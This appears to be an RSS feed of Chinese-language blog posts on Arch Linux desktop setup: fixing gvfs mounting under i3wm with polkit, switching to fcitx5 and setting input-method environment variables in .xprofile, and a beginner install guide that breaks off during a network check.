<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>Arch Linux - 标签 - WeepingDogel</title>
        <link>http://weepingdogel.github.io/tags/arch-linux/</link>
        <description>Arch Linux - 标签 - WeepingDogel</description>
        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><managingEditor>weepingdogel@gmail.com (WeepingDogel)</managingEditor>
            <webMaster>weepingdogel@gmail.com (WeepingDogel)</webMaster><lastBuildDate>Sat, 16 Jan 2021 23:59:59 &#43;0800</lastBuildDate><atom:link href="http://weepingdogel.github.io/tags/arch-linux/" rel="self" type="application/rss+xml" /><item>
    <title>如何解决 gvfs 在 i3wm 下无法挂载的问题</title>
    <link>http://weepingdogel.github.io/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3_gvfs_%E5%9C%A8_i3wm_%E4%B8%8B%E6%97%A0%E6%B3%95%E6%8C%82%E8%BD%BD%E7%9A%84%E9%97%AE%E9%A2%98/</link>
    <pubDate>Sat, 16 Jan 2021 23:59:59 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3_gvfs_%E5%9C%A8_i3wm_%E4%B8%8B%E6%97%A0%E6%B3%95%E6%8C%82%E8%BD%BD%E7%9A%84%E9%97%AE%E9%A2%98/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/img/image_2021-01-09_16-24-45.png" referrerpolicy="no-referrer">
            </div><h2 id="序">序</h2>
<p>呃&hellip; 前面其实没什么可以说的废话，就是出问题了嘛&hellip;</p>
<p>然后就去群里问了，弄好了，然后写一下怎么弄好的&hellip;</p>
<p>换 i3wm 了，然后使用文件管理器挂载别的分区的时候，突然弹出这个报错&hellip;</p>
<p></p>
<p>这个问题一般是缺包，</p>
<p>好吧其实就是少装了东西。</p>
<p>我们需要装的是 <code>polkit</code> 这个东西&hellip;</p>
<p>如果不知道它是啥的话，看 Arch Wiki 的这个页面。</p>
<ul>
<li><a href="https://wiki.archlinux.org/index.php/Polkit" target="_blank" rel="noopener noreffer">Polkit - ArchWiki</a></li>
</ul>
<h2 id="解决过程">解决过程</h2>
<p>首先安装 <code>polkit</code> ，</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo pacman -S polkit
</span></span></code></pre></td></tr></table>
</div>
</div><p>装完后，我们还需要安装其对应的图形前端。</p>
<p>如图，我们有很多可以选择。</p>
<p></p>
<p>我这里选择 Gnome 的，比较习惯..</p>
<p>用 <code>pacman</code> 就可以装了，</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo pacman -S polkit-gnome 
</span></span></code></pre></td></tr></table>
</div>
</div><p>如果想用其他的，把 <code>polkit-gnome</code> 替换成其他包名即可。</p>
<p>但是装完还不行，还得设置启动项，原因？ 在这：</p>
<blockquote>
<p>If you are using a graphical environment, make sure that a graphical authentication agent is installed and <a href="https://wiki.archlinux.org/index.php/Autostarting" target="_blank" rel="noopener noreffer">autostarted</a> on login.</p>
<p>——<a href="https://wiki.archlinux.org/index.php/Polkit#Authentication_agents" target="_blank" rel="noopener noreffer">Arch Wiki 里写的</a></p>
</blockquote>
<p>大意就是，如果你要用的话，得保持这个程序运行&hellip;</p>
<p>大概是这样吧，想看完整意思就去谷歌翻译吧..</p>
<p>接下来我要做的是想办法启动&hellip;</p>
<p>其实我们在终端里直接输入 wiki 上对应的路径就可以用了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ /usr/lib/polkit-gnome/polkit-gnome-authentication-agent-1 &amp;
</span></span></code></pre></td></tr></table>
</div>
</div><p>但这样的话每次都要打一遍，反正我是觉得麻烦～ rua～</p>
<p>所以要设置开机启动，一般是可以这样的..</p>
<p></p>
<p>嘛&hellip; i3wm 的话，要参考这个文档了。</p>
<ul>
<li><a href="https://i3wm.org/docs/userguide.html#_automatically_starting_applications_on_i3_startup" target="_blank" rel="noopener noreffer">i3: i3 User’s Guide</a></li>
</ul>
<p>接下来呢，我就直接编辑 <code>~/.config/i3/config</code> 这个文件。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ vim ~/.config/i3/config
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后在里面加入&hellip;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1"># 登录时，启动 polkit-gnome </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">exec</span> --no-startup-id /usr/lib/polkit-gnome/polkit-gnome-authentication-agent-1
</span></span></code></pre></td></tr></table>
</div>
</div><p></p>
<p>然后我就重启了。</p>
<p>嗯，可以用了。</p>
<p></p>
<p>然后我试着输入密码，敲下去之后&hellip; 嗯，又报错了..</p>
<p></p>
<p>看英文就知道.. 这其实是另一个问题了..</p>
<p>其实它 balabla 一大堆，只不过是 <code>ntfs-3g</code> 这个包我又忘了装而已啦..</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo pacman -S ntfs-3g
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后就好了&hellip;</p>
<p>不过截图是我今晚截的..</p>
<p></p>
<h2 id="结尾">结尾</h2>
<p>然后我就又可以快乐地使用 <code>i3wm</code> 啦～</p>
]]></description>
</item><item>
    <title>关于 fcitx5 ，以及最近的环境变量问题</title>
    <link>http://weepingdogel.github.io/posts/%E5%85%B3%E4%BA%8Efcitx5/</link>
    <pubDate>Sat, 25 Jul 2020 13:25:46 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/%E5%85%B3%E4%BA%8Efcitx5/</guid>
    <description><![CDATA[<h2 id="发生了啥">发生了啥</h2>
<p>最近我收到了一条这样的消息</p>
<blockquote>
<p>使用 <code>$HOME/.pam_environment</code> 设置环境变量的用户注意啦！由于 <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4708" target="_blank" rel="noopener noreffer">CVE-2010-4708</a>, pam 上游在 1.4.0 版本中设置了默认不读取用户的环境变量设置，需要用户自行更换环境变量设置位置或恢复原默认读取行为。</p>
<p>ref: <a href="https://blog.lilydjwg.me/2020/7/22/linux-environment-variables.215496.html" target="_blank" rel="noopener noreffer">Linux 的环境变量怎么设 依云&rsquo;s Blog</a></p>
</blockquote>
<p><del>为什么十年的漏洞现在才修啊喂！！！</del></p>
<p>Emmmm, 这么说就是 <code>.pam_environment</code> 这个文件不能用了&hellip;&hellip;</p>
<p>这里感谢 <a href="https://blog.lilydjwg.me/2020/7/22/linux-environment-variables.215496.html" target="_blank" rel="noopener noreffer">依云</a> 写出了各种情况的应对方法</p>
<p>我这里记一篇在 xfce + lightdm 环境下更换 fcitx5 的东西&hellip; 其他具体的可以参考云云写的.. (逃</p>
<h2 id="fcitx5-与-fcitx">fcitx5 与 fcitx</h2>
<ul>
<li>Fcitx</li>
</ul>
<blockquote>
<p><a href="https://en.wikipedia.org/wiki/Fcitx" target="_blank" rel="noopener noreffer">Fcitx</a> (Flexible Input Method Framework) ──即小企鹅输入法，它是一个以 GPL 方式发布的<a href="https://en.wikipedia.org/wiki/Input_method" target="_blank" rel="noopener noreffer">输入法</a>平台,可以通过安装引擎支持多种输入法，支持简入繁出，是在 Linux 操作系统中常用的中文输入法。它的优点是，短小精悍、跟程序的兼容性比较好。</p>
<p>&mdash; <a href="https://wiki.archlinux.org/index.php/Fcitx_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">Arch Wiki</a></p>
</blockquote>
<ul>
<li>Fcitx5</li>
</ul>
<blockquote>
<p>Fcitx5 是继 <a href="https://wiki.archlinux.org/index.php/Fcitx" target="_blank" rel="noopener noreffer">Fcitx</a> 后的新一代输入法框架。</p>
<p>&mdash; <a href="https://wiki.archlinux.org/index.php/Fcitx5_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">Arch Wiki</a></p>
</blockquote>
<p>日常偷懒，直接引用(逃</p>
<h2 id="好啦直接开始吧">好啦，直接开始吧</h2>
<blockquote>
<p>先贴出我的系统情况</p>
<p>操作系统：Arch Linux</p>
<p>桌面环境：xfce</p>
<p>显示管理器：lightdm</p>
</blockquote>
<p>实际上，只要把原来写 <code>.pam_environment</code> 中的输入法环境变量写到 <code>.xprofile</code> 里面就可以解决这个问题，但是我想试试 fcitx5。</p>
<h3 id="卸载掉-fcitx">卸载掉 fcitx</h3>
<p>首先我们要先卸载掉原来的 fcitx ，我之前用的是 <code>fcitx-googlepinyin</code> 这个输入法，所以这个包也要卸掉，因为会有依赖</p>
<p>除此之外，与 fcitx 有一定关系的都要卸掉，不然 <code>pacman</code> 会报错，所以你要执行这个</p>
<blockquote>
<p>（PS：你可能用的不是谷歌输入法，所以请把 <code>fcitx-googlepinyin</code> 改成你装的输入法的包名）</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">sudo pacman -Rs fcitx-configtool fcitx-googlepinyin fcitx-qt5 fcitx
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来，将这个文件删除，反正也没用了 (逃</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo rm -rf ./.pam_environment
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="安装-fcitx5">安装 fcitx5</h3>
<p>现在来安装 fcitx5，这样子弄</p>
<ul>
<li>
<p>fcitx5</p>
<ul>
<li>主包，不用多解释啦～</li>
</ul>
</li>
<li>
<p>fcitx5-chinese-addons</p>
<ul>
<li>中文输入法包&hellip;. Arch Wiki 里面是这样解释的:
<blockquote>
<p><a href="https://www.archlinux.org/packages/?name=fcitx5-chinese-addons" target="_blank" rel="noopener noreffer">fcitx5-chinese-addons</a> 包含了大量中文输入方式：拼音、双拼、五笔拼音、自然码、仓颉、冰蟾全息、二笔等</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>fcitx5-im</p>
<ul>
<li>环境依赖包，要装的，不然在一些软件上打不出字</li>
</ul>
</li>
<li>
<p>fcitx5-configtool</p>
<ul>
<li>fcitx5 的 GUI 配置工具，因为我不懂怎么修改配置文件，所以就装了这个。在上面三个装完之后装。</li>
</ul>
</li>
</ul>
<p>那么，执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo pacman -S fcitx5 fcitx5-chinese-addons fcitx5-im fcitx5-configtool
</span></span></code></pre></td></tr></table>
</div>
</div><p>软件包安装完成后，理论上它是会开机启动的，但是嘛，也有可能出点玄学问题，先手动做一下这个</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo cp /usr/share/applications/fcitx5.desktop ~/.config/autostart/ -v
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="环境变量">环境变量</h3>
<p>嗯哼，最后就是设置环境变量了，既然 <code>.pam_environment</code> 不能用了，那要写在哪里呢？</p>
<p><a href="https://blog.lilydjwg.me/2020/7/22/linux-environment-variables.215496.html" target="_blank" rel="noopener noreffer">云云</a>说：</p>
<blockquote>
<p>使用 X11 的桌面环境，通常通过 display manager 来登录，比如 lightdm 和 sddm。这俩都支持 <code>~/.xprofile</code>。这个文件会在启动过程中被 source，使用的 shell 是由 dm 自己确定的。lightdm 和 sddm 都是用的 <code>/bin/sh</code>（分别位于 <code>/etc/lightdm/Xsession</code> 和 <code>/usr/share/sddm/scripts/Xsession</code> 文件里）。可以看到，除了读取 <code>.xprofile</code> 外，lightdm 也会读取 <code>.profile</code>。sddm 甚至连 bash、zsh、tcsh、fish 的启动配置脚本都给读了。</p>
</blockquote>
<p>也就是说，我们需要把 fcitx5 的环境变量写在 <code>.xprofile</code> 这个文件里面</p>
<p>然后&hellip;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ vim ./.xprofile
</span></span></code></pre></td></tr></table>
</div>
</div><p>在里面写入这些东西</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">INPUT_METHOD</span><span class="o">=</span>fcitx5
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">GTK_IM_MODULE</span><span class="o">=</span>fcitx5
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">QT_IM_MODULE</span><span class="o">=</span>fcitx5
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">XMODIFIERS</span><span class="o">=</span>@im<span class="o">=</span>fcitx5
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来你可以选择重启 <code>lightdm</code> ，</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo systemctl restart lightdm
</span></span></code></pre></td></tr></table>
</div>
</div><p>或者重启系统</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo reboot
</span></span></code></pre></td></tr></table>
</div>
</div><p>此时，xfce 的状态栏出现了一个键盘，但是按 <kbd><code>CTRL</code></kbd> + <kbd><code>SPACE</code></kbd> 无法弹出中文输入法，这下怎么办呢？</p>
<p>直接右键那个键盘图标，点击配置，然后进入内个 QT 写的配置工具里添加中文输入法就可以啦～～！</p>
<p></p>
<p>只需要双击就可以添加到左边哦～</p>
<p>然后点击 OK，开始享受 fcitx5 吧</p>
<h2 id="参考链接">参考链接</h2>
<ul>
<li><a href="https://blog.lilydjwg.me/2020/7/22/linux-environment-variables.215496.html" target="_blank" rel="noopener noreffer">Linux 的环境变量怎么设 - 依云&rsquo;s Blog</a></li>
<li><a href="https://wiki.archlinux.org/index.php/Fcitx5_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">Fcitx5 (简体中文) - ArchWiki</a></li>
<li><a href="https://en.wikipedia.org/wiki/Fcitx" target="_blank" rel="noopener noreffer">Fcitx - Wikipedia</a></li>
<li><a href="https://wiki.archlinux.org/index.php/Fcitx_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">Fcitx (简体中文) - ArchWiki</a></li>
</ul>
]]></description>
</item><item>
    <title>怎样安装 Arch Linux</title>
    <link>http://weepingdogel.github.io/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/</link>
    <pubDate>Sat, 13 Jun 2020 12:53:25 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/images/wallhaven-nky7y7.png" referrerpolicy="no-referrer">
            </div><h2 id="arch-linux是什么">Arch Linux是什么？</h2>
<p><strong><a href="https://wiki.archlinux.org/index.php/Arch_Linux_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">Arch Linux</a></strong> 是一个通用 x86_64_ GNU/Linux 发行版，它采用滚动升级模式，尽权力给用户提供最新版本的稳定软件，因其&quot;简洁、现代、实用、以用户为中心&quot;的原则而得名。</p>
<p>Arch Wiki 上已经写明其原则</p>
<blockquote>
<p>简洁</p>
<p>Arch Linux 将简洁定义为：避免任何不必要的添加、修改和复杂增加。它提供的软件都来自原始开发者(上游)，仅进行和发行版(下游)相关的最小修改。</p>
<p>不包含上游不愿意接受的补丁。绝大部分 Arch 下游补丁都已经被上游接受，下一个正式版本里会包含。</p>
<p>配置文件也是来自上游，仅包含发行版必须的调整，比如特殊的文件系统路径变动。Arch 不会在安装一个软件包后就自动启动服务。</p>
<p>软件包通常都和一个上游项目直接对应。仅在极少数情况下才会拆分软件包。</p>
<p>官方不支持图形化配置界面，建议用户使用命令行或文本编辑器修改设置。</p>
</blockquote>
<blockquote>
<p>现代</p>
<p>Arch尽全力保持软件处于最新的稳定版本，只要不出现系统软件包破损，都尽量用最新版本。Arch采用滚动升级策略，安装之后可以持续升级。</p>
<p>Arch向GNU/Linux用户提供了许多新特性，包括systemd初始化系统、现代的文件系统、LVM2/EVMS、软件磁盘阵列（软RAID）、udev支持、initcpio（附带mkinitcpio）以及最新的内核。</p>
</blockquote>
<blockquote>
<p>实用</p>
<p>Arch 注重实用性，避免意识形态之争。最终的设计决策都是由开发者的共识决定。开发者依赖基于事实的技术分析和讨论，避免政治因素，不会被流行观点左右。</p>
<p>Arch Linux 的仓库中包含大量的软件包和编译脚本。用户可以按照需要进行自由选择。仓库中既提供了开源、自由的软件，也提供了闭源软件。实用性大于意识形态.</p>
</blockquote>
<blockquote>
<p>以用户为中心</p>
<p>许多 Linux 发行版都试图变得更“用户友好”，Arch Linux 则一直是，永远会是“以用户为中心”。此发行版是为了满足贡献者的需求，而不是为了吸引尽可能多的用户。Arch 适用于乐于自己动手的用户，他们愿意花时间阅读文档，解决自己的问题。</p>
<p>Arch 鼓励每一个用户 参与 和贡献，报告和帮助修复 bugs，提供软件包补丁和参加核心 项目：Arch 开发者都是志愿者，通过持续的贡献成为团队的一员。Archers 可以自行贡献软件包到 Arch 用户仓库, 提升 ArchWiki 文档质量, 在 论坛, 邮件列表, IRC 中给其它用户提供技术支持. Arch Linux 是全球很多用户的选择，已经有很多国际社区提供帮助和文档翻译。</p>
</blockquote>
<p>以上内容引用自 Arch Wiki 词条: <a href="https://wiki.archlinux.org/index.php/Arch_Linux_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29#%E5%8E%9F%E5%88%99" target="_blank" rel="noopener noreffer">https://wiki.archlinux.org/index.php/Arch_Linux_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#%E5%8E%9F%E5%88%99</a></p>
<p>更多关于 Arch Linux 的介绍可以<a href="https://wiki.archlinux.org/index.php/Arch_Linux_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">参考这里</a></p>
<h2 id="如何安装">如何安装</h2>
<p>现在我们要知道的是如何安装它。</p>
<p>其实在Arch Wiki上已经有了安装指南，但是对于 Linux 新手或从未使用过 Linux 的入坑者来说似乎不太容易读懂。因此，这里将会简单的写出安装方法以及过程。</p>
<h3 id="安装条件">安装条件</h3>
<p>总的来说，Arch 对配置的要求并不是太高，因为它默认安装完不带任何软件（甚至是 vim、wget、git）。但是，由于用户需要安装和使用的软件不同，因此配置需求也会根据实际情况而变化。</p>
<p>这里根据个人经验例举几个，仅供参考</p>
<blockquote>
<p>不使用图形界面</p>
<ul>
<li>处理器需求: 1.0Ghz 单核或更好的</li>
<li>内存需求: 1GB 足够</li>
<li>显卡需求: 能亮就行</li>
</ul>
</blockquote>
<blockquote>
<p>图形界面: lxde</p>
<ul>
<li>处理器需求: 2.0Ghz 单核或更好的</li>
<li>内存: 2GB 或者更多</li>
<li>显卡需求: 能亮就行&hellip;.</li>
</ul>
</blockquote>
<blockquote>
<p>图形界面: xfce</p>
<ul>
<li>处理器需求: 2.0GHz 单核 ~ 3.0 Ghz 单核 或更好的</li>
<li>内存: 至少 2GB ，4GB 很够用</li>
<li>显卡需求: 能亮还得有 128MB 显存</li>
</ul>
</blockquote>
<blockquote>
<p>图形界面: Gnome</p>
<ul>
<li>处理器需求: 双核 2.0GHz以上</li>
<li>内存: 4GB 足够，但推荐更多</li>
<li>显卡需求: 一般的Intel核显如果有256MB显存就很流畅了</li>
<li>(一位不愿意透露姓名的 Gnome 用户表示不要推荐 Gnome)</li>
</ul>
</blockquote>
<blockquote>
<p>图形界面: KDE</p>
<ul>
<li>处理器需求: 尽量要有 3.0GHz 双核，至少 2.6GHz 双核</li>
<li>内存: 4GB 足够，但推荐更多</li>
<li>显卡需求: 尽量比上面 Gnome 的更好一些</li>
</ul>
</blockquote>
<p>Emmmm&hellip; 总的来说&hellip; 只要是个电脑，都能运行起来，只不过用 KDE 和 Gnome 会比较卡而已.. 只要不是上世纪的486电脑.. xfce应该都是带得动的。</p>
<h3 id="准备工作">准备工作</h3>
<p>这里会说明一下安装前需要准备什么</p>
<h4 id="安装介质">安装介质</h4>
<p>如果你曾经安装过其他 Linux 发行版，则不需要花太多时间看这一段，因为Arch Linux的安装介质的制作与其他发行版也是相差不大的。</p>
<p>如果你曾经重装过 Windows 操作系统，但没试过安装Linux ，也许你只需要稍微看一下，就会明白怎么做了</p>
<ul>
<li>
<p>第一步、下载Arch Linux的ISO镜像文件</p>
<ul>
<li>你可以去 <a href="https://www.archlinux.org/download/" target="_blank" rel="noopener noreffer">Arch 官网</a>下载，也可以去你所在位置的开源镜像站下载，这里贴出
<ul>
<li><a href="https://mirrors.tuna.tsinghua.edu.cn/archlinux/iso/latest//" target="_blank" rel="noopener noreffer">清华源传送门</a></li>
<li><a href="http://mirrors.ustc.edu.cn/archlinux/iso/" target="_blank" rel="noopener noreffer">中科大源传送门</a></li>
</ul>
</li>
</ul>
</li>
<li>
<p>第二步、准备一个U盘</p>
<ul>
<li>你需要准备一个U盘来刻录 ArchISO，最好是 8GB 以上</li>
</ul>
</li>
<li>
<p>第三步、使用刻录软件将 ArchISO 刻录进U盘</p>
<ul>
<li>Windows 环境: 这里推荐 <a href="https://rufus.ie/zh_CN.html" target="_blank" rel="noopener noreffer">rufus</a></li>
<li>Linux 环境: 可以使用 DD 命令 （如果电脑不支持EFI启动，不推荐。）</li>
</ul>
</li>
</ul>
<p>篇幅原因，这个就不写太多吧</p>
<h4 id="不爆炸的心态">不爆炸的心态</h4>
<p>如果你从未接触过 Arch Linux 或者是 Linux 新手，在安装过程中难免会遇到问题，这个时候不要慌张也不要着急，平静下来通过各种途径找出解决方法，不过这都需要有个不爆炸的心态。</p>
<h4 id="阅读-arch-wiki">阅读 Arch Wiki</h4>
<p>Arch 官方搭建了一个 Wiki 供用户查阅资料，当遇到安装过程中遇到麻烦的时候，也许 <a href="https://wiki.archlinux.org/index.php/Main_page_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">Arch Wiki</a> 能够帮到你。</p>
<h2 id="一切准备就绪出发">一切准备就绪，出发</h2>
<p>当你准备好一切的时候，就可以开始安装了。</p>
<h3 id="启动-arch-iso">启动 Arch ISO</h3>
<p>首先插入你的 U 盘，然后在开机时按特定的按键以启动 U 盘中的ArchISO</p>
<p>这里放出不同品牌设备或主板的按键</p>
<blockquote>
<p>品牌台式</p>
<ul>
<li>联想台式电脑 F12</li>
<li>惠普台式电脑 F12</li>
<li>宏基台式电脑 F12</li>
<li>戴尔台式电脑 ESC</li>
<li>神舟台式电脑 F12</li>
<li>华硕台式电脑 F8</li>
<li>方正台式电脑 F12</li>
<li>清华同方台式电脑 F12</li>
<li>海尔台式电脑 F12</li>
<li>明基台式电脑 F8</li>
</ul>
</blockquote>
<blockquote>
<p>品牌笔记本</p>
<ul>
<li>联想笔记本 F12</li>
<li>宏基笔记本 F12</li>
<li>外星人笔记本 F12</li>
<li>小米笔记本 F12</li>
<li>华硕笔记本 ESC</li>
<li>惠普笔记本 F9</li>
<li>联想 Thinkpad F12</li>
<li>戴尔笔记本 F12</li>
<li>神舟笔记本 F12</li>
<li>东芝笔记本 F12</li>
<li>三星笔记本 F12</li>
<li>IBM笔记本 F12</li>
<li>富士通笔记本 F12</li>
<li>海尔笔记本 F12</li>
<li>方正笔记本 F12</li>
<li>清华同方笔记本 F12</li>
<li>微星笔记本 F11</li>
<li>明基笔记本 F9</li>
<li>技嘉笔记本 F12</li>
<li>Gateway笔记本 F12</li>
<li>eMachines笔记本 F12</li>
<li>索尼笔记本 ESC</li>
<li>苹果笔记本 开机长按 option 键</li>
</ul>
</blockquote>
<blockquote>
<p>主板</p>
<ul>
<li>华硕主板 F8</li>
<li>技嘉主板 F12</li>
<li>微星主板 F11</li>
<li>映泰主板 F9</li>
<li>梅捷主板 ESC 或 F12</li>
<li>七彩虹主板 ESC 或 F11</li>
<li>华擎主板 F11</li>
<li>斯巴达卡主板 ESC</li>
<li>昂达主板 F11</li>
<li>双敏主板 ESC</li>
<li>翔升主板 F10</li>
<li>精英主板 ESC 或 F11</li>
<li>冠盟主板 F11 或 F12</li>
<li>富士康主板 ESC 或 F12</li>
<li>顶星主板 F11 或 F12</li>
<li>铭瑄主板 ESC</li>
<li>盈通主板 F8</li>
<li>捷波主板 ESC</li>
<li>Intel 主板 F12</li>
<li>杰微主板 ESC 或 F8</li>
<li>致铭主板 F12</li>
<li>磐英主板 ESC</li>
<li>磐正主板 ESC</li>
<li>冠铭主板 F9</li>
</ul>
</blockquote>
<p>按下对应的按键，选择你的 U 盘，即可启动 Arch ISO。</p>
<p></p>
<p>如上图，Arch ISO 启动后将会出现这样的界面，直接选择第一项回车即可。</p>
<h3 id="确认是否连接到网络">确认是否连接到网络</h3>
<p>启动Arch ISO之后，你将操作一个运行在 tty 上的 Live CD，这个时候第一件事就是检查有没有连接到网络。</p>
<p>你可以使用 <code>ping</code> 这个命令来确认是否连接到网络，随便一个非局域网地址都可以</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># ping weepingdogel.github.io
</span></span></code></pre></td></tr></table>
</div>
</div><p>若返回出类似这样的信息，则说明网络连接是正常的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">PING weepingdogel.github.io (185.199.111.153) 56(84) bytes of data.
</span></span><span class="line"><span class="cl">64 bytes from 185.199.111.153 (185.199.111.153): icmp_seq=2 ttl=48 time=113 ms
</span></span><span class="line"><span class="cl">64 bytes from 185.199.111.153 (185.199.111.153): icmp_seq=3 ttl=48 time=110 ms
</span></span><span class="line"><span class="cl">64 bytes from 185.199.111.153 (185.199.111.153): icmp_seq=4 ttl=48 time=114 ms
</span></span><span class="line"><span class="cl">64 bytes from 185.199.111.153 (185.199.111.153): icmp_seq=5 ttl=49 time=113 ms
</span></span><span class="line"><span class="cl">64 bytes from 185.199.111.153 (185.199.111.153): icmp_seq=6 ttl=48 time=111 ms
</span></span><span class="line"><span class="cl">64 bytes from 185.199.111.153 (185.199.111.153): icmp_seq=7 ttl=48 time=112 ms
</span></span><span class="line"><span class="cl">64 bytes from 185.199.111.153 (185.199.111.153): icmp_seq=8 ttl=49 time=113 ms
